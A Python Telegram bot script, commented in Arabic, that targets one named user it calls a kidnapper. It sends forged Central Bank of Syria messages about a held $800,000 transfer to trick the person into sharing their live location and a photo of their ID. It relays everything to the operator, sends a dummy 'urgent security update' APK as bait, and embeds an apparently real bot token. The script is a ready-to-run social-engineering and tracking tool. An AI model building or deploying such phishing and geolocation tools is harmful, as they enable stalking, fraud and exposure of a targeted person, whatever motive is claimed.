#!/usr/bin/env python3
"""
بوت تليجرام متكامل - خدع مقنعة للخاطف
"""

import os
import time
import logging
import requests
from datetime import datetime
from telebot import TeleBot, types

# ================== الإعدادات ==================
BOT_TOKEN = "8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y"
OWNER_ID = 8391968596
TARGET_USERNAME = "Hnfkldmemd"
# ==============================================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
bot = TeleBot(BOT_TOKEN)

visitors = {}
target_cid = None

# ================== زر الدخول ==================

@bot.message_handler(commands=['start'])
def start_handler(message):
    cid = message.chat.id
    uid = message.from_user.id
    uname = message.from_user.username or ""
    fname = message.from_user.first_name or ""

    visitors[cid] = {
        'username': uname,
        'name': fname,
        'user_id': uid,
        'first_seen': datetime.now().isoformat()
    }

    global target_cid
    if uname.lower() == TARGET_USERNAME.lower():
        target_cid = cid
        bot.send_message(OWNER_ID, f"🎯 الخاطف متصل!\n👤 @{uname}\n🆔 {cid}")

    if uid == OWNER_ID:
        show_admin_panel(cid)
        return

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔑 تأكيد الدخول", callback_data="login"))
    bot.send_message(cid, "⚡ نظام التحقق ⚡\nالرجاء الضغط لتأكيد الدخول", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "login")
def login_callback(call):
    bot.send_message(call.message.chat.id, "تم التحقق بنجاح")

# ================== لوحة التحكم ==================

def show_admin_panel(cid):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📍 طلب موقع مقنع", "📸 طلب صورة مقنع")
    markup.row("📱 معلومات الجهاز", "📊 حالة المتصلين")
    markup.row("📨 إرسال APK", "📝 رسالة مخصصة")
    markup.row("🔄 إعادة تشغيل")

    bot.send_message(cid,
        "🟢 **لوحة التحكم**\nاختر الأمر:",
        reply_markup=markup,
        parse_mode="Markdown")

# ================== طلب الموقع ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📍 طلب موقع مقنع")
def request_location_convincing(message):
    global target_cid
    if not target_cid:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل بعد")
        return

    text = """🏦 **البنك المركزي السوري - توثيق التحويل**

تم تعليق تحويل مبلغ 800,000 دولار أمريكي
لحين تأكيد هوية المستلم.

📌 **الإجراء المطلوب:**
اضغط على زر "مشاركة الموقع" أدناه
لتأكيد استلام التحويل.

⏳ المهلة: 24 ساعة
⚠️ عدم الالتزام يعني إلغاء التحويل تلقائياً.

🔐 هذا الإجراء آمن ومشفر."""
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("📍 مشاركة الموقع", request_location=True)
    markup.add(btn)
    
    bot.send_message(target_cid, text, reply_markup=markup, parse_mode="Markdown")
    bot.send_message(OWNER_ID, "✅ تم إرسال طلب موقع مقنع للخاطف")

# ================== استقبال الموقع ==================

@bot.message_handler(content_types=['location'])
def handle_location(message):
    if message.location:
        lat = message.location.latitude
        lon = message.location.longitude
        
        global target_cid
        if message.chat.id == target_cid:
            maps_link = f"https://www.google.com/maps?q={lat},{lon}"
            msg = f"""📍 **تم استلام موقع الخاطف!**

**العرض (Latitude):** {lat}
**الطول (Longitude):** {lon}
**الدقة:** {message.location.horizontal_accuracy or 'غير متوفر'} متر

🔗 [فتح في خرائط جوجل]({maps_link})"""
            
            bot.send_message(OWNER_ID, msg, parse_mode="Markdown")
            bot.send_location(OWNER_ID, lat, lon)
            
            with open("target_location.txt", "a") as f:
                f.write(f"{datetime.now().isoformat()},{lat},{lon}\n")

# ================== طلب صورة (مقنع) ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📸 طلب صورة مقنع")
def request_photo_convincing(message):
    global target_cid
    if not target_cid:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل بعد")
        return

    text = """🆔 **البنك المركزي السوري - توثيق الهوية**

لإتمام تحويل 800,000 دولار إلى حسابك،
الرجاء إرسال صورة لهويتك (بطاقة شخصية أو جواز سفر).

⚠️ هذا الإجراء إلزامي لاستلام الأموال وفق قانون مكافحة غسيل الأموال."""
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("📤 إرسال صورة")
    markup.add(btn)
    
    bot.send_message(target_cid, text, reply_markup=markup, parse_mode="Markdown")
    bot.send_message(OWNER_ID, "✅ تم إرسال طلب صورة مقنع للخاطف")

# ================== استقبال الصورة ==================

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    if message.photo:
        photo = message.photo[-1]
        file_info = bot.get_file(photo.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        os.makedirs("photos", exist_ok=True)
        file_path = f"photos/target_photo_{timestamp}.jpg"
        
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)
        
        with open(file_path, 'rb') as f:
            bot.send_photo(OWNER_ID, f, caption=f"📸 **صورة من الخاطف**\n⏰ {timestamp}")

# ================== معلومات الجهاز ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📱 معلومات الجهاز")
def show_device_info(message):
    global target_cid
    if not target_cid:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل بعد")
        return
    
    data = visitors.get(target_cid, {})
    info = f"""**📱 معلومات الخاطف**

👤 **اليوزر:** @{data.get('username', '?')}
📝 **الاسم:** {data.get('name', '?')}
🆔 **User ID:** {data.get('user_id', '?')}
💬 **Chat ID:** {target_cid}
⏰ **أول اتصال:** {data.get('first_seen', '?')}"""
    
    bot.send_message(OWNER_ID, info, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📊 حالة المتصلين")
def show_visitors(message):
    if not visitors:
        bot.send_message(OWNER_ID, "📊 لا يوجد متصلين")
        return
    
    msg = "📊 **المتصلون:**\n\n"
    for cid, data in visitors.items():
        uname = data.get('username', '?')
        is_target = "🎯" if uname.lower() == TARGET_USERNAME.lower() else "⚪"
        msg += f"{is_target} @{uname} - `{cid}`\n"
    
    bot.send_message(OWNER_ID, msg, parse_mode="Markdown")

# ================== إرسال APK ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📨 إرسال APK")
def send_fake_apk(message):
    global target_cid
    if not target_cid:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل بعد")
        return
    
    apk_path = "Security_Update_2026.apk"
    with open(apk_path, 'wb') as f:
        f.write(b'PK\x03\x04' + b'\x00' * 5000 + b'AndroidManifest.xml')
    
    caption = "📲 **تحديث أمني عاجل من البنك المركزي**\nتم اكتشاف ثغرة أمنية في جهازك. الرجاء تثبيت هذا التحديث فوراً."
    
    with open(apk_path, 'rb') as f:
        bot.send_document(target_cid, f, caption=caption, parse_mode="Markdown")
    
    bot.send_message(OWNER_ID, "✅ تم إرسال APK وهمي")
    os.remove(apk_path)

# ================== رسالة مخصصة ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📝 رسالة مخصصة")
def custom_message_prompt(message):
    msg = bot.send_message(OWNER_ID, "✏️ أرسل النص الذي تريد إرساله للخاطف:")
    bot.register_next_step_handler(msg, send_custom_message)

def send_custom_message(message):
    global target_cid
    if target_cid:
        bot.send_message(target_cid, message.text)
        bot.send_message(OWNER_ID, f"✅ تم إرسال:\n\n{message.text}")
    else:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")

# ================== إعادة تشغيل ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🔄 إعادة تشغيل")
def restart_bot(message):
    bot.send_message(OWNER_ID, "🔄 جاري إعادة التشغيل...")
    os._exit(0)

# ================== استقبال أي رسالة ==================

@bot.message_handler(func=lambda m: True)
def catch_all(message):
    cid = message.chat.id
    uname = message.from_user.username or ""

    if uname.lower() == TARGET_USERNAME.lower() and message.from_user.id != OWNER_ID:
        text = message.text or "[وسائط]"
        bot.send_message(OWNER_ID, f"✉️ **رسالة من الخاطف:**\n{text}")

# ================== التشغيل ==================

if __name__ == "__main__":
    os.makedirs("photos", exist_ok=True)
    print("✅ البوت شغال! انتظار اتصال الخاطف...")
    bot.infinity_polling()
